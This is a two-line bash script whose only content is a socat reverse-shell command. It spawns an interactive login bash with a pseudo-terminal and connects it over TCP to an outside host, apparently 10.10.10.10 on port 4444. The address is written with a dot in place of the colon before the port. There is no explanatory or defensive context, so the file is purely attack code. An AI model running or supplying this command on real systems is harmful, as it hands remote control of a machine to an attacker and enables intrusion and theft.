#!/bin/bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10.4444
